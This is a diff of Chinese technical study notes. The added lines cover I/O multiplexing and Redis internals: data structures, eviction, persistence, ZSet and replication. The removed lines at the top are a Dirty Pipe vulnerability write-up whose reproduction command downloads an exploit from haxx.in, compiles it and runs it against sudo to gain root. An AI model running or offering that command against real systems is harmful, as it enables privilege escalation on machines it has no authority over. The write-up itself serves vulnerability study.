+资源节省：通过单线程处理多个 I&#x2F;O 操作，可以避免过多的线程或进程创建，从而节省系统资源，减少上下文切换的开销。
 
-其实上述的情景就是一些EXP的攻击思路了，如果能够理解这个情景将会对之后理解EXP有很大帮助。
-漏洞复现wget https://haxx.in/files/dirtypipez.cgcc dirtypipez.c -o dirtypipez./dirtypipez `which sudo`
+I&#x2F;O 多路复用的典型技术I&#x2F;O 多路复用的实现方式依赖于操作系统提供的系统调用，常见的实现技术包括：
+
+**select**：
+最早期的 I&#x2F;O 多路复用机制，允许程序监控多个文件描述符，判断哪些文件描述符已经准备好进行读写操作。
+select 通过传递文件描述符集合来实现，每次调用都会检查所有文件描述符的状态，因此在大量文件描述符的情况下性能会变差。
+受限于文件描述符数量（通常是 1024）。
+
+
+**poll**：
+类似于 select，但解决了 select 的一些局限，比如文件描述符数量的限制。
+poll 使用一个数组来存储文件描述符和事件，能处理任意数量的文件描述符，但性能仍然随着文件描述符数量的增加而降低。
+
+
+**epoll**：
+Linux 下提供的高效 I&#x2F;O 多路复用机制，特别适用于处理大量并发连接。
+epoll 使用事件驱动的方式，只关注那些发生事件的文件描述符，避免了不必要的检查和遍历，从而提高了性能。
+支持边缘触发（ET）和水平触发（LT）模式，能够更精确地控制 I&#x2F;O 事件。
+epoll 有两种工作模式：
+
+
+水平触发（Level Triggered，LT）：
+当某个文件描述符有数据可读时，epoll 会通知用户程序。如果程序没有读走所有数据，它会继续通知直到数据被完全读取。
+
+
+边缘触发（Edge Triggered，ET）：
+当某个文件描述符的状态从不可读变为可读时，epoll 会通知用户程序。只有当文件描述符的状态发生变化时，epoll 才会触发通知。相比于 LT 模式，ET 模式需要程序更精细地处理数据。
 
 
 
-漏洞利用脚本分析查看https://haxx.in/files/dirtypipez.c的源码进行分析：
-prepare_pipe()函数负责将pipe的全部缓存页的flags设置PIPE_BUF_FLAG_CAN_MERGE,其实就是做了上述情景的前两步hax()函数负责向指定文件写入指定的内容，其思路与上述情景一致通过向具有SUID特权位的文件(这也是使用which sudo作为参数的原因)写入内容，然后执行，实现任意代码执行的效果。
-漏洞修复漏洞根本原因在于splice()系统调用的copy_page_to_iter_pipe()函数没有初始化flags，因此在其中加入这样一行代码即可：
-buf-&gt;flags=0;
 
+**kqueue**（在 BSD 系统中）：
+类似于 epoll，是 BSD 系统（如 macOS）中的 I&#x2F;O 多路复用机制。kqueue 能高效地监控多个 I&#x2F;O 事件，支持灵活的事件处理机制。
+
+
+
+I&#x2F;O 多路复用的优缺点优点
+高并发处理：在单线程或少量线程中处理多个 I&#x2F;O 操作，避免了线程和进程切换的开销，能处理更多的并发请求。
+节省资源：减少了线程和进程的创建和销毁，避免了过多的资源消耗。
+避免阻塞：通过非阻塞的 I&#x2F;O 操作，程序能够在等待数据时继续执行其他任务，提升系统响应能力。
+
+缺点
+实现复杂：相比传统的阻塞式 I&#x2F;O，I&#x2F;O 多路复用需要处理更多的复杂性，如事件的管理和响应。
+适用场景有限：虽然 I&#x2F;O 多路复用适用于高并发场景，但它对于一些不需要处理大量并发的简单应用来说可能过于复杂。
+系统依赖性：不同操作系统提供的 I&#x2F;O 多路复用机制（如 select、poll、epoll）有差异，可能需要考虑跨平台的适配问题。
+
+
+redis都有哪些数据结构Redis 提供了多种数据结构，旨在帮助开发者高效地存储和操作不同类型的数据。每种数据结构在 Redis 中都扮演着不同的角色，针对特定的应用场景进行优化。以下是 Redis 支持的主要数据结构：
+1. String（字符串）
+描述：Redis 中的基本数据类型，可以存储任何类型的字符串，包括数字、文本、二进制数据等。
+特点：
+每个键值对中的值都是一个字符串，最大长度为 512 MB。
+支持常见的字符串操作，如设置、获取、拼接、截取等。
+用途广泛，适合存储缓存、会话信息、计数器等。
+
+
+常见操作：
+SET key value：设置键值对。
+GET key：获取键对应的值。
+INCR key：对值进行加 1 操作（计数器）。
+
+
+
+2. List（列表）
+描述：一个简单的字符串列表，按照插入顺序排序，可以在列表的两端进行推送、弹出等操作。
+特点：
+支持从左侧或右侧操作（即双端队列）。
+适合队列、栈等数据模型。
+支持基于索引的访问和范围查询。
+
+
+常见操作：
+LPUSH key value：将值推入列表的左端。
+RPUSH key value：将值推入列表的右端。
+LPOP key：从左侧弹出一个元素。
+RPOP key：从右侧弹出一个元素。
+LRANGE key start stop：返回列表指定范围内的元素。
+
+
+
+3. Set（集合）
+描述：无序的字符串集合，集合中的元素是唯一的，没有重复值。
+特点：
+支持集合操作，如交集、并集和差集等。
+适合用来存储不允许重复的数据。
+常用于标签、集合运算等。
+
+
+常见操作：
+SADD key member：将成员添加到集合中。
+SREM key member：移除集合中的成员。
+SMEMBERS key：返回集合中的所有成员。
+SINTER key1 key2：返回两个集合的交集。
+
+
+
+4. Sorted Set（有序集合）
+描述：与 Set 类似，但每个元素都有一个分数（score），根据分数进行排序。
+特点：
+元素按照分数从小到大排序，且分数相同的元素会按照插入顺序排序。
+支持范围查询，可以根据分数范围进行查询，适用于排行榜、延迟队列等场景。
+
+
+常见操作：
+ZADD key score member：将元素及其分数添加到有序集合中。
+ZRANGE key start stop：返回指定区间内的元素。
+ZREM key member：移除有序集合中的成员。
+ZRANK key member：返回成员的排名。
+
+
+
+5. Hash（哈希）
+描述：键值对集合，适合存储对象类型的数据。哈希可以通过字段（field）来存储多个值。
+特点：
+每个哈希可以包含多个字段和相应的值，类似于一个对象或记录。
+适合存储多个关联字段的数据（例如，用户信息）。
+
+
+常见操作：
+HSET key field value：为哈希添加一个字段和值。
+HGET key field：获取哈希中指定字段的值。
+HGETALL key：获取哈希中的所有字段和值。
+HDEL key field：删除哈希中的指定字段。
+
+
+
+6. Bitmaps（位图）
+描述：位图是对字符串类型的一种扩展，可以将字符串的每一位作为一个独立的 bit（0 或 1）来使用。
+特点：
+适用于高效的布尔值集合操作，比如用户是否参与活动。
+可以在不需要额外内存的情况下存储大量的布尔值。
+
+
+常见操作：
+SETBIT key offset value：在指定位置设置位值。
+GETBIT key offset：获取指定位置的位值。
+BITCOUNT key：统计指定键中为 1 的位数。
+
+
+
+9. Streams（流）
+描述：Redis Streams 是一个类似消息队列的数据结构，用于存储和处理消息流。
+特点：
+支持按时间戳存储消息，并支持消费者组（Consumer Groups）。
+可用于构建类似 Kafka 的消息队列系统。
+
+
+常见操作：
+XADD key * field value：向流中添加一条消息。
+XREAD：从流中读取消息。
+XGROUP CREATE：创建消费者组。
+
+
+
+总结Redis 提供了非常丰富和高效的数据结构，适用于各种不同的使用场景。根据不同的需求，你可以选择合适的数据结构来存储和处理数据：
+
+String：适用于缓存、计数器等简单数据。
+List：适合队列、栈等线性数据。
+Set：用于去重、集合操作等。
+Sorted Set：适合排行榜、延迟队列等按顺序操作的数据。
+Hash：适合存储对象或多字段的数据。
+Bitmaps：适用于位级操作。
+Streams：适用于消息队列等场景。
+
+这些数据结构可以帮助开发者根据实际需求进行灵活的设计与优化，使得 Redis 成为一个非常强大的数据存储系统。
+
+
+
+类型
+特点
+场景
+
+
+
+String
+快速简单，最大512MB
+缓存单值、计数器、Token
+
+
+Hash
+结构体对象存储
+用户信息、配置项
+
+
+List
+有序双向链表
+消息队列、日志
+
+
+Set
+无序唯一集合
+去重、标签、集合运算
+
+
+ZSet
+有序集合，带权重
+排行榜、延迟队列
+
+
+
+Redis 是单线程的，为什么还能这么快？单线程不是慢吗？
+所有数据在内存中，访问没有磁盘 IO
+单线程模型，避免上下文切换和加锁开销
+基于 epoll 的 IO 多路复用，处理高并发连接
+简单高效的数据结构（C实现 + ziplist&#x2F;intset优化）
+
+
+Redis的过期机制和内存淘汰策略一、Key 的过期机制（TTL）Redis 支持设置每个 key 的过期时间，到时间后自动删除。
+🔹设置过期时间的命令SET user:1 &quot;Tom&quot; EX 60     # 设置 60 秒后过期EXPIRE user:1 60           # 单独设置过期时间TTL user:1                 # 查询剩余时间
+
+Redis 什么时候删除这些 key？重点：不是精确时钟删除，而是惰性 + 定期删除机制组合
+删除策略详解
+惰性删除（Lazy）
+客户端访问 key 时，Redis 发现已过期，就立刻删掉（并返回 nil）
+
+
+定期删除（主动扫描）
+每 100ms，Redis 会随机抽样一批带过期时间的 key，删除过期的
+如果发现超 25% 的 key 都过期了，就加快扫描节奏
+
+
+
+为什么不逐个精准定时删除？会造成高 CPU 负载，扫描量大，Redis 单线程承受不住
+
+二、内存淘汰机制（Memory Eviction）当 Redis 达到设置的最大内存（maxmemory），又需要写入新 key 时，会触发淘汰机制。
+# 配置示例maxmemory 512mbmaxmemory-policy allkeys-lru
+
+
+常见的内存淘汰策略
+
+
+策略名
+含义
+推荐使用场景
+
+
+
+noeviction
+默认值，不淘汰，写入时报错
+不建议线上使用
+
+
+volatile-lru
+从有过期时间的 key 中淘汰最少使用的
+有效控制热数据内存
+
+
+allkeys-lru
+所有 key 中淘汰最少使用的
+推荐：缓存场景
+
+
+volatile-ttl
+从有过期时间的 key 中淘汰快过期的
+延迟淘汰控制
+
+
+allkeys-random
+所有 key 中随机淘汰
+一般用作测试
+
+
+volatile-random
+有过期时间的 key 中随机淘汰
+比较少用
+
+
+
+Redis 设置了 maxmemory 和淘汰策略，为什么还是 OOM 了？
+设置的是 noeviction，没有开启淘汰功能
+有大量 key 没设置 TTL，策略是 volatile-*，Redis 找不到 key 可以淘汰
+有大 key（bigkey），触发淘汰时清理不及时
+写入速度远超淘汰速度（高并发写入 + 单线程处理）
+
+
+实战建议
+
+
+建议
+理由
+
+
+
+key 必须设置 TTL
+防止缓存雪崩，内存泄露
+
+
+建议使用 allkeys-lru
+更加自动化地控制内存
+
+
+避免存大 key（如超大 hash、list）
+淘汰慢、容易卡主线程
+
+
+监控 Redis 内存使用
+用 INFO MEMORY 或 redis_exporter 上 Prometheus 监控
+
+
+
+自问自答
+Redis 的过期 key 是怎么删除的？是实时的吗？ 不是实时的， 惰性+定期
+Redis 的惰性删除和定期删除分别是什么？ 
+Redis 的内存淘汰策略有哪些？哪个最常用？
+如果写入大量 key，但内存没满 Redis 就挂了，可能的原因有哪些？ 有设置最大内存， 或者是过多内存碎片，  或者是有写入大key，导致CPU撑不住卡主进程了…..
+项目中怎么控制 Redis 占用内存？  设置**maxmemory**、内存回收策略、过期时间控制
+
+
+缓存穿透、缓存击穿、缓存雪崩缓存穿透问题描述客户端频繁请求数据库中根本不存在的 key，由于缓存 miss，Redis 不命中，所有请求都落到底层数据库，造成数据库压力激增，甚至打挂。
+典型场景请求不存在的用户 ID，比如 GET user:-1，Redis miss，数据库 miss，不断重复请求。
+解决方案
+缓存空值
+对于数据库返回 null 的数据，也缓存一个标记，例如：user:-1 =&gt; &quot;null&quot;，设置较短过期时间。
+
+
+布隆过滤器（BloomFilter）
+在 Redis 之前做一层布隆过滤器，用于快速判断 key 是否存在，避免无意义请求。
+
+
+接口参数校验
+提前在 API 层做参数合法性校验，比如 ID 必须 &gt; 0。
+
+
+
+
+缓存击穿问题描述一个热点 key 恰好过期，大量并发请求在这个瞬间同时打到数据库，造成数据库压力瞬时激增。
+典型场景某商品详情是热点，每秒几千请求，刚好 GET product:123 在某个时刻过期，所有请求瞬间穿透。
+解决方案
+互斥锁（分布式锁）
+第一个请求获取锁去加载数据，其它请求等待或短时间返回旧数据。
+
+
+永不过期 + 异步刷新
+不设置过期时间，而是定时刷新缓存（通过定时任务或消息队列）。
+
+
+合理设置过期时间 + 提前异步预热
+对热点 key 使用更长过期时间，或者在过期前预热。
+
+
+
+
+缓存雪崩问题描述大量 key 在同一时刻同时失效，所有请求同时穿透，数据库被压垮。
+典型场景比如你缓存设置了 1 小时统一过期，某一时刻恰好全部失效，系统瞬间崩溃。
+解决方案
+过期时间加随机扰动
+给每个 key 设置不同的过期时间，避免同一时间集中失效。例如 EX 600 + random(0~60)。
+
+
+热点数据永不过期 + 后台异步刷新
+降级保护机制
+当发现缓存异常，短路请求，直接返回默认值、静态页等。
+
+
+
+
+自问自答
+什么是缓存穿透？怎么解决？
+缓存击穿和穿透的区别是什么？
+怎么解决 Redis 大量 key 同时过期的雪崩问题？
+使用 Redis 做缓存时，是否建议 key 永久有效？
+有没有用过布隆过滤器？什么原理？ 是个概率性的数据结构， 用多个不同的哈希算法， 拿到的哈希值如果对应的都是1， 就是1， 只要有一个是0， 就是0， 因此存的数据量越大， 越容易误报
+
+Redis的持久化机制（RDB 与 AOF）Redis 虽然是内存数据库，但为了防止数据丢失，提供了两种持久化机制：RDB（快照）和 AOF（追加日志）。
+
+持久化方式概览
+
+
+类型
+全称
+特点
+数据安全性
+文件大小
+启动速度
+
+
+
+RDB
+Redis DataBase snapshot
+定期快照
+较低
+小
+快
+
+
+AOF
+Append Only File
+日志追加
+高
+大
+慢（需重放）
+
+
+混合模式
+RDB + AOF
+Redis 4.0 后默认
+综合优点
+可控
+快速恢复
+
+
+
+RDB（快照方式）原理
+Redis 在一定时间间隔内将内存数据写入一个压缩过的二进制文件（.rdb）
+触发方式：
+自动：配置 save 900 1（900 秒内至少 1 个 key 变动）
+手动：执行 SAVE 或 BGSAVE 命令
+
+
+
+优点
+启动恢复速度快
+文件体积小，适合备份、灾备迁移
+
+缺点
+可能丢失最近一次修改（最后一次快照之后的数据）
+BGSAVE 会 fork 子进程，写入大文件时会造成系统负载升高
+
+
+AOF（日志方式）原理
+所有写命令会追加到 .aof 文件中，Redis 重启时按顺序“重放命令”恢复数据
+三种刷盘策略（由 appendfsync 决定）：
+always：每次写都刷盘（最安全，最慢）
+everysec：每秒刷一次（默认）
+no：由操作系统决定（可能丢失几秒）
+
+
+
+优点
+数据恢复更完整（最多丢失 1 秒）
+适合对数据完整性要求高的场景
+
+缺点
+文件越来越大，需要定期重写（BGREWRITEAOF）
+启动时需要重放日志，恢复速度比 RDB 慢
+
+
+混合持久化（Redis 4.0+）原理
+在 AOF 重写时，先将当前快照（RDB 格式）写入 AOF，然后再追加后续写命令
+好处：
+启动速度几乎和 RDB 一样快
+数据完整性和 AOF 一样高
+
+
+
+开启方式aof-use-rdb-preamble yes
+
+
+配置示例save 900 1appendonly yesappendfsync everysecdir /var/lib/redis
+
+
+自问自答
+Redis 持久化有几种方式？分别适用于什么场景？
+如果 Redis 宕机了，数据怎么恢复？会不会丢数据？
+RDB 和 AOF 哪个恢复速度更快？哪个更安全？
+怎么避免 RDB&#x2F;AOF 持久化造成主线程卡顿？
+
+
+实战建议
+
+
+建议
+理由
+
+
+
+开启 AOF + everysec 模式
+实现安全性和性能的平衡
+
+
+配置 save 900 1 等参数
+保留定期快照，便于快速恢复
+
+
+设置 aof-use-rdb-preamble yes
+兼顾快速启动与完整性
+
+
+使用 Redis 主从 + 持久化
+容灾架构更稳妥
+
+
+Redis 是怎么做 AOF 重写的？会不会影响性能？在 Redis 中，AOF（Append Only File）重写 是一种用于优化磁盘 I&#x2F;O 和 AOF 文件大小的机制。AOF 重写是 Redis 在持久化数据时采取的一种方式，目的是定期生成新的 AOF 文件，从而减少旧文件的大小并提高性能。
+什么是 AOF 重写？Redis 使用 AOF 持久化机制时，会将所有的写命令记录到 AOF 文件中，这样即使 Redis 重启，数据也不会丢失。随着时间的推移，AOF 文件可能会变得非常大，尤其是在有大量写操作的场景下。为了避免 AOF 文件过大，Redis 提供了 AOF 重写（AOF rewrite） 机制。
+AOF 重写是指 Redis 会创建一个新的 AOF 文件，只记录 当前数据库状态 的最简写操作，从而生成一个更小的文件。这个过程不会影响 Redis 正常的写操作，但会在后台进行，保证 Redis 在重写期间继续为客户端提供服务。
+AOF 重写的工作原理
+触发条件：
+AOF 重写通常由 Redis 根据 AOF 文件的大小和重写条件来触发。重写会在 Redis 认为 AOF 文件过大时自动进行，或者也可以通过手动调用 BGREWRITEAOF 命令来触发。
+
+
+重写过程：
+在 AOF 重写过程中，Redis 会创建一个新的 AOF 文件，并在后台 重新生成 AOF 文件中的命令。这个过程会记录所有当前数据库状态所需的最小写命令。
+比如，如果数据库中某个键的值已经改变了多次，Redis 会将该键的最终状态写入新的 AOF 文件，而不再记录每次对该键的修改操作。
+
+
+AOF 重写的工作步骤：
+步骤 1：Redis 在后台创建一个新的 AOF 文件，并逐个遍历数据库中的所有键，生成一组命令来重新构建当前数据库的状态。
+步骤 2：当新的 AOF 文件创建完成后，Redis 会将当前 AOF 文件中的所有命令写入新文件中，确保新文件包含了数据库的最新状态。
+步骤 3：一旦新的 AOF 文件完成，Redis 会关闭原来的 AOF 文件，将新的文件替换为当前 AOF 文件。
+
+
+后台执行：
+在进行 AOF 重写时，Redis 会使用 后台（fork） 的方式创建一个子进程来执行重写操作。这个子进程会处理数据的写入，不会影响主进程的运行。
+这种方式允许 Redis 在 AOF 重写期间继续服务客户端请求，保证了系统的高可用性。
+
+
+
+AOF 重写是否会影响性能？AOF 重写的过程是通过 fork 子进程 来执行的，因此在执行重写时，Redis 主进程可以继续服务客户端请求。但是，AOF 重写操作还是会对性能产生一定的影响，具体体现在以下几个方面：
+
+内存占用：
+在 AOF 重写期间，Redis 会在后台创建一个子进程，并复制主进程的内存空间。这意味着在重写过程中，Redis 的内存使用量会增加，因为它需要同时保持原有的 AOF 文件和新的 AOF 文件内容。对于内存较小的机器，这可能会导致内存使用高峰。
+
+
+CPU 占用：
+AOF 重写需要扫描整个数据库，并生成新的 AOF 文件，这会消耗一定的 CPU 资源。虽然 Redis 会在后台执行这一过程，但在大数据量的情况下，CPU 的负载可能会暂时增高。
+
+
+磁盘 I&#x2F;O：
+AOF 重写会生成新的 AOF 文件，并将新的命令写入磁盘。这会增加磁盘的写入压力。如果磁盘性能较差或 I&#x2F;O 较高的场景下，可能会对性能产生影响。
+
+
+阻塞时间：
+在某些情况下，尤其是当 AOF 文件非常大，或者当系统资源有限时，AOF 重写可能会导致 Redis 的响应时间略微增加，特别是在频繁触发 AOF 重写时。
+
+
+fork 子进程的影响：
+Redis 使用 fork 创建子进程来执行 AOF 重写操作，而 fork 操作会占用一定的系统资源。虽然子进程会在重写完成后被销毁，但在 fork 的过程中，操作系统需要进行内存页的复制，这会消耗 CPU 和内存资源。
+
+
+
+如何减少 AOF 重写对性能的影响？为了减少 AOF 重写对性能的影响，可以采取以下策略：
+
+**合理设置 **auto-aof-rewrite-percentage** 和 ****auto-aof-rewrite-min-size**：
+auto-aof-rewrite-percentage：控制触发 AOF 重写的条件。它设置为相对于上次重写时 AOF 文件的大小增长百分比。
+auto-aof-rewrite-min-size：控制 AOF 文件的最小大小，只有当文件大小超过这个值时，才会考虑执行 AOF 重写。
+
+
+
+通过合理配置这两个参数，可以控制 AOF 重写的触发频率，从而避免频繁的 AOF 重写操作，减小对性能的影响。
+auto-aof-rewrite-percentage 100  # AOF 文件大小增加 100% 后进行重写auto-aof-rewrite-min-size 64mb  # AOF 文件超过 64MB 时才进行重写
+
+
+使用合适的硬件资源：
+如果可能，考虑为 Redis 配置更高性能的硬件，尤其是 I&#x2F;O 密集型的存储设备（如 SSD）。更强大的硬件可以显著减少 AOF 重写过程中对磁盘 I&#x2F;O 的压力。
+
+
+优化 **maxmemory-policy** 配置：
+在 Redis 中设置合理的内存回收策略，确保内存不会过度占用，避免因内存不足导致频繁的 AOF 重写。
+
+
+分批写入数据：
+对于大量写入数据的场景，考虑将数据写入 Redis 时分批处理，减少瞬时写入压力，降低 AOF 文件增长速度。
+
+
+使用 AOF + RDB 混合持久化（RDB + AOF）：
+Redis 还支持同时使用 RDB（快照） 和 AOF 两种持久化方式，您可以通过配置 Redis 在一定间隔内执行快照（RDB）保存，并在更高频次下执行 AOF 持久化。这可以减小对性能的影响，同时保证数据持久化。
+
+
+
+# 启用 RDB 和 AOF 混合持久化appendonly yesappendfsync everysecsave 900 1save 300 10save 60 10000
+
+总结AOF 重写是 Redis 为了优化 AOF 文件大小、提高性能和减少磁盘 I&#x2F;O 而采取的机制。虽然 AOF 重写通常是在后台进行，不会阻塞主进程，但它确实会消耗一些额外的 CPU 和内存资源，尤其是在大数据量的情况下。因此，合理的配置和硬件资源的支持是确保 AOF 重写不会对性能产生过大影响的关键。
+
+怎么避免 RDB&#x2F;AOF 持久化造成主线程卡顿在 Redis 中，RDB 和 AOF 是两种常见的持久化机制，它们会定期将内存中的数据持久化到磁盘，确保数据的持久性。但这两个过程可能会造成一定的 主线程卡顿，特别是在大规模数据存储或高并发环境下，RDB 和 AOF 持久化过程会占用大量的 CPU 和 I&#x2F;O 资源，从而影响 Redis 的响应速度和性能。
+下面是一些避免 RDB&#x2F;AOF 持久化造成主线程卡顿的方法
+1. 使用 RDB 快照时采用后台保存（save 和 BGSAVE）
+默认情况下，Redis 使用 **BGSAVE**（背景保存）来执行 RDB 快照操作。BGSAVE 会在后台创建一个子进程，主线程继续服务客户端请求。
+BGSAVE 操作不会阻塞主线程，它通过 fork() 子进程的方式执行，因此可以在不影响 Redis 主线程的情况下进行持久化。
+注意：如果在 Redis 配置中使用 **save** 命令来设置 RDB 快照（比如每隔 900 秒进行一次快照），如果在执行 RDB 时不使用 BGSAVE，则会导致 阻塞，因为此时 Redis 主线程会被锁定，直到 RDB 快照完成。
+
+配置：
+# RDB 快照配置示例save 900 1save 300 10save 60 10000
+
+在 BGSAVE 执行期间，主线程仍然可以继续处理客户端请求。
+2. 合理配置 AOF 持久化AOF（Append Only File）将 Redis 执行的所有写操作追加到 AOF 文件中，以保证持久化数据。AOF 的同步策略（appendfsync）决定了每次写入操作是如何同步到磁盘的：
+
+**appendfsync always**：每次写操作都会同步到磁盘，性能最低，通常不推荐。
+**appendfsync everysec**：每秒同步一次。是推荐的设置，性能和数据持久性之间有一个良好的平衡。
+**appendfsync no**：让操作系统决定何时将数据同步到磁盘，性能最高，但在系统崩溃时可能会丢失一些数据。
+
+推荐设置：
+appendonly yesappendfsync everysec  # 每秒钟一次同步到磁盘
+
+appendfsync everysec 可以最大限度减少 AOF 持久化对主线程的影响，同时确保数据的持久性。
+3. 启用 AOF 重写机制AOF 文件随着时间的推移会变得越来越大，这样会导致持久化操作变得非常慢，影响 Redis 的性能。为了防止 AOF 文件过大导致性能下降，Redis 提供了 AOF 重写（AOF rewrite） 机制。
+AOF 重写 的过程是将当前数据库的状态重新写入 AOF 文件，并且会创建一个新的 AOF 文件，而不记录所有历史操作。AOF 重写是通过一个后台进程来完成的，因此它不会影响主线程。
+AOF 重写的触发条件：
+
+当 AOF 文件的大小超出一定比例时（默认是 100%）。
+可以通过配置 auto-aof-rewrite-percentage 和 auto-aof-rewrite-min-size 来控制触发条件。
+
+配置示例：
+# 自动触发 AOF 重写的条件auto-aof-rewrite-percentage 100  # 当 AOF 文件大小增加 100% 时触发重写auto-aof-rewrite-min-size 64mb  # 当 AOF 文件超过 64MB 时触发重写
+
+通过合理配置 AOF 重写，Redis 可以自动优化 AOF 文件的大小，避免在文件过大的时候影响性能。
+4. 优化磁盘 I&#x2F;O 性能RDB 和 AOF 持久化操作都涉及到磁盘 I&#x2F;O，因此磁盘性能对于持久化的效率至关重要。使用更快的存储设备（例如 SSD）可以显著提高持久化过程的性能，减少对主线程的影响。
+优化建议：
+
+使用 SSD（固态硬盘）而不是传统的 HDD（机械硬盘），以减少磁盘 I&#x2F;O 的延迟。
+将 Redis 的数据目录和 AOF 文件存储在不同的物理磁盘上，避免磁盘 I&#x2F;O 竞争。
+通过 **vm.dirty_background_bytes** 等内核参数来调整操作系统的 I&#x2F;O 调度策略，优化磁盘写入效率。
+
+5. 定期执行 MEMORY PURGE 清理内存碎片当 Redis 进行大量写入和持久化时，内存碎片可能导致内存管理效率低下，从而影响 Redis 性能。使用 **MEMORY PURGE** 命令可以清理 Redis 中的内存碎片，释放无用内存，从而减少内存使用和提高性能。
+MEMORY PURGE  # 清理内存碎片
+
+定期执行内存清理操作有助于减轻持久化时的内存负担，从而改善 Redis 性能。
+6. 使用混合持久化（RDB + AOF）Redis 支持混合持久化，即同时使用 RDB 和 AOF。通过这种方式，Redis 可以在启动时使用 RDB 快照来恢复数据，而在写操作时使用 AOF 进行持久化。混合持久化通过减少 AOF 文件的大小来优化性能，并提高 Redis 的启动速度。
+启用混合持久化：
+appendonly yesappendfsync everysecrdbchecksum yes
+
+混合持久化的优势是，在不牺牲持久化的可靠性和完整性的情况下，通过 AOF 重写和 RDB 快照的结合来减少磁盘 I&#x2F;O 的压力。
+总结为了避免 RDB 和 AOF 持久化造成 Redis 主线程卡顿，可以采取以下措施：
+
+**使用 ****BGSAVE** 执行 RDB 快照，避免阻塞主线程。
+合理配置 AOF 持久化策略（推荐 appendfsync everysec）来平衡性能和持久性。
+利用 AOF 重写 来减少 AOF 文件的大小，避免性能下降。
+优化磁盘 I&#x2F;O 性能，使用 SSD 或更快的存储设备来提高持久化效率。
+定期清理内存碎片，通过 MEMORY PURGE 来减轻内存管理负担。
+使用混合持久化（RDB + AOF）来提升性能，减少 AOF 文件大小。
+
+通过这些方法，您可以减少 RDB 和 AOF 持久化对 Redis 性能的影响，提高系统的响应速度和可用性。
+Redis是怎么存储有序集合zset的Redis 的 ZSet（有序集合），它在 Redis 中扮演着非常核心的角色，特别适用于排行榜、延时队列、权重调度等场景。
+
+什么是 ZSet（Sorted Set）ZSet 是 Redis 中的一种数据结构，全称是 有序集合（Sorted Set）。
+它的特点是：
+
+每个元素都是唯一的（像 Set）
+每个元素关联一个 score（分数），按 score 排序（像优先队列）
+可以按分数范围、高低排名、高低分数做高效查询
+
+你可以把 ZSet 看成是：带权重的 Set + 排序链表 + 快速查找结构
+
+数据结构实现：跳表 + 哈希表ZSet 底层用了两个结构：
+哈希表（dict）
+快速定位元素对应的 score
+key 是元素，value 是 score
+
+
+跳表（skiplist）
+维持元素按 score 升序排列
+用于支持范围查找、区间遍历、按排名查询等
+
+
+
+为什么用跳表而不是红黑树？
+
+插入&#x2F;删除逻辑简单
+查询效率也接近 O(log n)
+Redis 追求极致性能，跳表是工程中性能 + 简洁度权衡最佳的结构
+
+
+核心操作和性能
+
+
+操作
+命令
+时间复杂度
+说明
+
+
+
+添加&#x2F;更新元素
+ZADD key score member
+O(log n)
+插入或更新元素，跳表中调整顺序
+
+
+删除元素
+ZREM key member
+O(log n)
+删除成员，同时从 dict 和 skiplist 删除
+
+
+查询成员的分数
+ZSCORE key member
+O(1)
+直接从 dict 中查
+
+
+按排名查成员
+ZRANGE key start stop
+O(log n + m)
+从跳表中按顺序取元素
+
+
+查某个成员的排名
+ZRANK key member
+O(log n)
+在跳表中向下查找节点，统计 rank
+
+
+范围删除
+ZREMRANGEBYSCORE key min max
+O(log n + m)
+从跳表中范围定位，然后批量删除
+
+
+分数区间查找
+ZRANGEBYSCORE key min max
+O(log n + m)
+先用跳表查 min，再往后遍历
+
+
+获取总数
+ZCARD key
+O(1)
+获取元素个数
+
+
+获取某 score 范围内的个数
+ZCOUNT key min max
+O(log n)
+范围查找后累加统计
+
+
+其中 m 表示范围内返回的元素数量。
+
+跳表结构内部逻辑（示意）以一个 ZSet 示例：
+ZADD z 5 aliceZADD z 10 bobZADD z 7 tomZADD z 1 kate
+
+跳表结构会长成这样（层数为随机生成的）：
+Level 3:            bobLevel 2:      tom - bobLevel 1: kate - tom - alice - bob
+
+每一层是有序链表，底层记录所有元素，查询从顶层开始，逐层往下，最终在底层找到目标。
+
+应用场景举例排行榜（经典）ZADD game 1000 user1ZADD game 950 user2ZADD game 1200 user3ZRANGE game 0 -1 WITHSCORES   # 按分数升序输出所有玩家ZREVRANK game user1           # 查看 user1 的排名（倒序）
+
+延时队列用 score 表示未来的执行时间戳：
+ZADD task_queue 1680000000 task_id_123ZRANGEBYSCORE task_queue 0 1680001000 LIMIT 0 1# 查当前需要执行的任务
+
+动态权重调度（比如任务优先级）score 表示优先级，值越小优先级越高：
+ZADD job 1 job1ZADD job 3 job2ZRANGE job 0 0        # 获取优先级最高的任务ZREM job job1         # 删除执行完成的任务
+
+
+与 List、Set、Hash 的对比
+
+
+结构
+是否排序
+是否支持范围查找
+插入&#x2F;查找复杂度
+用途
+
+
+
+List
+按插入顺序
+支持（按位置）
+O(1)&#x2F;O(n)
+消息队列
+
+
+Set
+无序
+不支持
+O(1)
+唯一元素集合
+
+
+ZSet
+按 score 排序
+支持
+O(log n)
+排行榜、延迟队列
+
+
+Hash
+无序
+不支持
+O(1)
+映射结构
+
+
+
+内存占用注意事项ZSet 中的跳表节点比较复杂，包含：
+
+元素值（字符串）
+score（double）
+多级 forward 指针
+span 用于计算 rank
+
+如果元素很多、节点层数高，跳表的内存占用会比普通链表&#x2F;集合大，需要注意评估。
+
+总结
+ZSet 是 Redis 提供的有序集合结构
+底层是 哈希表 + 跳表 的组合，既支持快速定位，也支持按顺序遍历
+提供排名、区间删除、分数查找、范围扫描等高级操作
+实现简单、查询快、非常适合排行榜、权重调度、定时任务等场景
+是 Redis 中最具代表性的高性能数据结构之一
+
+好的，我们进入 Redis 学习的第五讲，讲解：
+
+Redis 的主从复制与 Sentinel 高可用机制在生产环境中，单台 Redis 实例面临单点故障、无法扩容等问题。为了解决这类问题，Redis 提供了主从复制和哨兵机制（Sentinel），实现基本的高可用。
+
+主从复制（Replication）作用
+实现读写分离（主写从读）
+提供故障转移能力的基础
+多机热备，提高数据安全性
+
+架构示意Client       |    +------+       +------+    | Master | --&gt; | Slave1|    +------+       +------+                      |                   +------+                   |Slave2|                   +------+
+
+启动主从复制在从库的 redis.conf 中设置：
+replicaof &lt;master-ip&gt; &lt;master-port&gt;
+
+或者运行时命令：
+replicaof 127.0.0.1 6379
+
+同步过程
+从库连接主库，发送 PSYNC 命令
+首次同步：主库执行 BGSAVE 生成 RDB 文件并发送给从库
+增量同步：之后通过命令流（replication backlog）持续同步
+
+特点
+主库写，从库同步，数据最终一致
+从库是只读状态
+支持链式结构（slave -&gt; slave）
+
+
+Sentinel（哨兵）机制作用
+自动监控 Redis 主从节点状态
+主节点故障时，自动故障转移（failover）
+提供主节点的服务发现功能
+
